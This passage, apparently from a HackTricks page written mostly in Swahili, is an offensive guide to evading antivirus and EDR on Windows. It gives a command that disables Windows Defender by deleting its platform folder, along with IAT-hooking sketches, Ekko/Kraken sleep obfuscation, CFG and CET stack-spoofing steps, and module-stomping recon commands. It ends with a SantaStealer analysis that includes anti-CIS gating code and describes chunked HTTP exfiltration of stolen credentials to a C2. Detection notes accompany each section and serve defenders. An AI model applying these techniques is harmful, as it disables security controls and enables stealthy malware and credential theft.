wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuchunguza njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi/registry ya service ikionyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Dondosha/badilisha DLLs ambazo Defender hupakia kutoka kwenye application directory yake ili kutekeleza code ndani ya processes za Defender. Tazama sehemu iliyo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili kwenye start inayofuata path iliyosanidiwa isipate resolve na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba mbinu hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuipeleka ndani ya target module yenyewe kwa kuifanya hook kwenye Import Address Table (IAT) yake na kuelekeza APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii huongeza evasion zaidi ya API surface ndogo ambayo vifaa vingi huonyesha (mf., CreateProcessA), na huongeza ulinzi huo huo kwa BOFs na post‑exploitation DLLs.

High-level approach
- Weka PIC blob kando ya target module kwa kutumia reflective loader (prepended au companion). PIC lazima iwe self‑contained na position‑independent.
- Kadiri host DLL inavyopakiwa, pitia IMAGE_IMPORT_DESCRIPTOR yake na u-patch IAT entries kwa imports zilizolengwa (mf., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye thin PIC wrappers.
- Kila PIC wrapper hutekeleza evasions kabla ya tail-calling real API address. Evasions za kawaida ni pamoja na:
- Memory mask/unmask karibu na call (mf., encrypt beacon regions, RWX→RX, badilisha page names/permissions) kisha restore baada ya call.
- Call-stack spoofing: tengeneza benign stack na uhamie kwenye target API ili call-stack analysis ipate frames zinazotarajiwa.
- Kwa compatibility, export interface ili Aggressor script (au inayolingana nayo) iweze kusajili APIs zipi zihookwe kwa Beacon, BOFs na post-ex DLLs.

Why IAT hooking here
- Hufanya kazi kwa code yoyote inayotumia hooked import, bila kubadilisha tool code au kutegemea Beacon kui-proxy APIs maalum.
- Inashughulikia post-ex DLLs: hooking LoadLibrary* hukuruhusu ku-intercept module loads (mf., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion ile ile kwa API calls zao.
- Hurejesha matumizi ya kuaminika ya process-spawning post-ex commands dhidi ya call-stack–based detections kwa ku-wrap CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Tumia patch baada ya relocations/ASLR na kabla ya first use of the import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ziwe ndogo sana na PIC-safe; resolve the true API kupitia original IAT value uliyonasa kabla ya patching au kupitia LdrGetProcedureAddress.
- Tumia RW → RX transitions kwa PIC na epuka kuacha writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs huunda fake call chain (return addresses ndani ya benign modules) kisha hupivot kwenda kwenye real API.
- Hii hushinda detections zinazotegemea canonical stacks kutoka Beacon/BOFs kwenda kwa sensitive APIs.
- Oanisha na stack cutting/stack stitching techniques ili kuingia ndani ya expected frames kabla ya API prologue.

Operational integration
- Prepend reflective loader kwa post-ex DLLs ili PIC na hooks zianzishe automatically wakati DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zipate transparently faida ya same evasion path bila code changes.

Detection/DFIR considerations
- IAT integrity: entries zinazo resolve kwenda non-image (heap/anon) addresses; periodic verification ya import pointers.
- Stack anomalies: return addresses zisizo belong kwa loaded images; abrupt transitions kwenda non-image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes to IAT, early DllMain activity inayobadilisha import thunks, unexpected RX regions created at load.
- Image-load evasion: ikiwa hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

On CFG-enabled targets, the first indirect jump into a mid-function gadget such as `jmp [rbx]` or `jmp rdi` will usually crash the process with `STATUS_STACK_BUFFER_OVERRUN` because the gadget is not present in the module's CFG metadata. To keep Ekko/Kraken-style chains alive inside hardened processes:

- Register every indirect destination used by the chain with `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` and `CFG_CALL_TARGET_VALID` entries.
- For addresses inside loaded images (`ntdll`, `kernel32`, `advapi32`), the `MEMORY_RANGE_ENTRY` must start at the **image base** and cover the **full image size**.
- For manually mapped/PIC/stomped regions, use the **allocation base** and allocation size instead.
- Mark not only the dispatch gadget, but also exports reached indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) and any attacker-controlled executable sections that will become indirect targets.

This turns ROP/JOP-style sleep chains from "works only in non-CFG processes" into a reusable primitive for `explorer.exe`, browsers, `svchost.exe`, and other endpoints compiled with `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement is noisy and can break on CET Shadow Stack systems because a spoofed `Rip` must still agree with the hardware shadow stack. A safer sleep-masking pattern is:

- Pick another thread in the same process and read its `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Backup the current thread's real TEB/TIB.
- Capture the real sleeping context with `GetThreadContext`.
- Copy **only** the real `Rip` into the spoof context, leaving the spoofed `Rsp`/stack state intact.
- During the sleep window, copy the spoof thread's `NT_TIB` into the current TEB so stack walkers unwind inside a legitimate stack range.
- After the wait finishes, restore the original TIB and thread context.

This preserves a CET-consistent instruction pointer while misleading EDR stack walkers that trust TEB stack metadata to validate unwinds.

### APC-based alternative: Kraken Mask

If timer-queue dispatch is too signatured, the same sleep-encrypt-spoof-restore sequence can be executed from a suspended helper thread using queued APCs:

- Create a helper thread with `NtTestAlert` as entrypoint.
- Queue prepared `CONTEXT` frames/APCs with `NtQueueApcThread` and drain them with `NtAlertResumeThread`.
- Store the chain state on the heap instead of the helper stack to avoid exhausting the default 64 KB thread stack.
- Use `NtSignalAndWaitForSingleObject` to atomically signal the start event and block.
- Suspend the main thread before restoring the TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) to reduce the race window where a scanner could catch a half-restored stack.

This swaps the `CreateTimerQueueTimer` + `NtContinue` signature for a helper-thread/APC signature while keeping the same RC4 masking and stack-spoofing goals.

Additional detection ideas
- `NtSetInformationVirtualMemory` with `VmCfgCallTargetInformation` shortly before sleeps, waits, or APC dispatch.
- `GetThreadContext`/`SetThreadContext` wrapped around `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, or `ConnectNamedPipe`.
- `NtQueryInformationThread` followed by direct writes into the current thread's TEB/TIB stack bounds.
- `NtQueueApcThread`/`NtAlertResumeThread` chains that indirectly reach `SystemFunction032`, `VirtualProtect`, or section-permission restoration helpers.
- Repeated use of short gadget signatures such as `FF 23` (`jmp [rbx]`) or `FF E7` (`jmp rdi`) as dispatch pivots inside signed modules.


## Precision Module Stomping

Module stomping executes payloads from the **`.text` section of a DLL already mapped inside the target process** instead of allocating obvious private executable memory or loading a fresh sacrificial DLL. The overwrite target should be a **loaded, disk-backed image** whose code space can absorb the payload without corrupting code paths the process still needs.

### Reliable target selection

Naive stomping against common modules such as `uxtheme.dll` or `comctl32.dll` is fragile: the DLL may not be loaded in the remote process, and a too-small code region will crash the process. A more reliable workflow is:

1. Enumerate the target process modules and keep a **names-only include list** of DLLs already loaded.
2. Build the payload first and record its **exact byte size**.
3. Scan candidate DLLs on disk and compare the PE section **`.text` `Misc_VirtualSize`** against the payload size. This matters more than the file size because it reflects the size of the executable section **when mapped in memory**.
4. Parse the **Export Address Table (EAT)** and choose an exported function RVA as the stomp start offset.
5. Calculate the **blast radius**: if the payload exceeds the selected function boundary, it will overwrite adjacent exports laid out after it in memory.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Maelezo ya uendeshaji
- Pendelea DLLs **ambazo tayari zimepakiwa** ndani ya remote process ili kuepuka telemetry ya `LoadLibrary`/unexpected image loads.
- Pendelea exports ambazo ni nadra kutekelezwa na target application, vinginevyo kawaida code paths zinaweza kugonga bytes zilizostompwa kabla au baada ya thread creation.
- Large implants mara nyingi huhitaji kubadilisha shellcode embedding kutoka kwa string literal hadi **byte-array/braced initializer** ili full buffer iwakilishwe kwa usahihi kwenye injector source.

Mawazo ya detection
- Remote writes ndani ya **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya private RWX/RX allocations za kawaida.
- Export entry points ambako bytes zilizo kwenye memory hazilingani tena na backing file kwenye disk.
- Remote threads au context pivots zinazoanza execution ndani ya legitimate DLL export whose first bytes were recently modified.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences dhidi ya DLL `.text` pages zikifuatiwa na thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) inaonyesha jinsi modern info-stealers zinavyounganisha AV bypass, anti-analysis na credential access katika workflow moja.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) huhesabu installed keyboard layouts kupitia `GetKeyboardLayoutList`. Ikiwa Cyrillic layout inapatikana, sample huweka empty `CIS` marker na kusitisha kabla ya kuendesha stealers, kuhakikisha haijawahi detonated kwenye excluded locales huku ikiacha hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A hutembea kwenye orodha ya process, huhesabu jina la kila moja kwa custom rolling checksum, na kulinganisha dhidi ya embedded blocklists za debuggers/sandboxes; hurudia checksum kwenye jina la kompyuta na kuangalia working directories kama `C:\analysis`.
- Variant B hukagua system properties (process-count floor, recent uptime), huita `OpenServiceA("VBoxGuest")` kugundua VirtualBox additions, na hufanya timing checks karibu na sleeps ili kugundua single-stepping. Hit yoyote husitisha kabla modules hazijazinduliwa.

### Fileless helper + double ChaCha20 reflective loading

- DLL/EXE kuu hujumuisha Chromium credential helper ambayo aidha hushushwa disk au manual mapped in-memory; fileless mode huresolve imports/relocations yake yenyewe ili helper artifacts zisiweze kuandikwa.
- Hiyo helper huhifadhi second-stage DLL iliyosimbwa mara mbili kwa ChaCha20 (two 32-byte keys + 12-byte nonces). Baada ya pass zote mbili, huifungua reflectively blob hiyo (no `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing kuingiza kwenye live Chromium browser, kurithi AppBound Encryption keys, na decrypt passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` hupitia global `memory_generators` function-pointer table na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi yake ya files baada ya ~45s join window.
- Baada ya kumaliza, kila kitu huzipiwa kwa `miniz` library iliyolinkiwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` hulala 15s na hutiririsha archive kwa 10 MB chunks kupitia HTTP POST kwenda `http://<C2>:6767/upload`, ikijifanya browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila chunk huongeza `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, na chunk ya mwisho huongeza `complete: true` ili C2 ijue reassembly imekamilika.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
